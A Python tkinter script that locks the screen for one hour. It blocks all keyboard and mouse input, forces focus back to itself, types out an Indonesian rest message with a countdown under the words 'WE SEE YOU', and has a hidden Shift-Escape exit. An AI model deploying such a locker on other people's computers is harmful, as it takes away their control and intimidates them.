import tkinter as tk
import os
import sys

def resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

class FullScreenBlocker:
    def __init__(self):
        self.root = tk.Tk()
        
        self.pesan_rahasia = "Istirahatlah selama 1 jam ini. Setelah itu, kembalilah berjuang untuk masa depanmu."
        self.indeks_huruf = 0
        self.remaining = 3600  # 1 jam dalam detik  
        
        self.setup_window()
        self.block_all_inputs()
        self.create_interface()
        self.root.after(500, self.efek_mengetik)

    def setup_window(self):
        """Configuration fenêtre plein écran impossible à quitter"""
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="black")

        self.root.geometry("{0}x{1}+0+0".format(
            self.root.winfo_screenwidth(),
            self.root.winfo_screenheight()
        ))
        self.root.focus_force()

    def block_all_inputs(self):
        """Mencegah input user tanpa merusak rendering teks pada Tkinter"""
        def block_everything(event=None):
            return "break"

        # ====== TOMBOL DARURAT RAHASIA ======
        def emergency_exit(event=None):
            self.root.destroy()
            sys.exit()

        self.root.bind_all("<Shift-Escape>", emergency_exit)
        # ====================================

        # Memblokir input fisik dari keyboard dan mouse
        user_input_events = [
            "<Key>", "<KeyPress>", "<KeyRelease>",
            "<Button>", "<ButtonPress>", "<ButtonRelease>",
            "<B1-Motion>", "<B2-Motion>", "<B3-Motion>", "<Motion>",
            "<MouseWheel>", "<Double-Button-1>", "<Triple-Button-1>"
        ]

        for event in user_input_events:
            self.root.bind_all(event, block_everything)

        # Menarik kembali fokus jika user mencoba memindahkan jendela aplikasi
        def enforce_focus(event=None):
            self.root.focus_force()
        self.root.bind("<FocusOut>", enforce_focus)

    def create_interface(self):
        """Membuat urutan tampilan: Gambar -> Teks Mengetik -> Timer"""
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.place(relx=0.5, rely=0.5, anchor="center")

        # 1. Menampilkan Elemen Gambar
        try:
            image_path = resource_path("image.png")
            image = tk.PhotoImage(file=image_path)
            img_label = tk.Label(main_frame, image=image, bg="black")
            img_label.image = image
            img_label.pack(pady=(0, 20))
        except:
            img_label = tk.Label(main_frame, text="[IMAGE]", fg="red", bg="black", font=("Arial", 24))
            img_label.pack(pady=(0, 20))

        # 2. Menampilkan Teks Berjalan Efek Mengetik (Warna Merah)
        self.typing_label = tk.Label(
            main_frame,
            text="",
            fg="red",  
            bg="black",
            font=("Segoe UI", 20),
            wraplength=800  
        )
        self.typing_label.pack(pady=(10, 20))

        # 3. Menyiapkan Elemen Timer (Disembunyikan, muncul setelah teks selesai diketik)
        self.text_label = tk.Label(
            main_frame,
            text="",
            fg="white",
            bg="black",
            font=("Segoe UI", 40)
        )

        # 4. Menampilkan Teks Tambahan di Posisi Paling Bawah
        self.bottom_label = tk.Label(
            main_frame,
            text="WE SEE YOU",
            fg="white",
            bg="black",
            font=("Segoe UI", 26)
        )
        self.bottom_label.pack(pady=(10, 0))

    def efek_mengetik(self):
        """Membuat teks muncul satu per satu karakter seperti mesin ketik"""
        if self.indeks_huruf < len(self.pesan_rahasia):
            teks_sekarang = self.pesan_rahasia[:self.indeks_huruf + 1]
            self.typing_label.config(text=teks_sekarang)
            self.indeks_huruf += 1
            
            # Mengatur kecepatan ketikan (100 milidetik per huruf)
            self.root.after(100, self.efek_mengetik)
        else:
            # Jika teks merah selesai diketik, munculkan timer tepat di bawah teks tersebut
            self.text_label.pack(after=self.typing_label, pady=(10, 20))
            self.update_timer()

    def update_timer(self):
        """Memperbarui angka hitungan mundur setiap 1 detik"""
        if self.remaining >= 0:
            h = self.remaining // 3600
            m = (self.remaining % 3600) // 60
            s = self.remaining % 60

            self.text_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")

            self.remaining -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.root.destroy()  
            sys.exit()           

if __name__ == "__main__":
    app = FullScreenBlocker()
    app.root.mainloop()
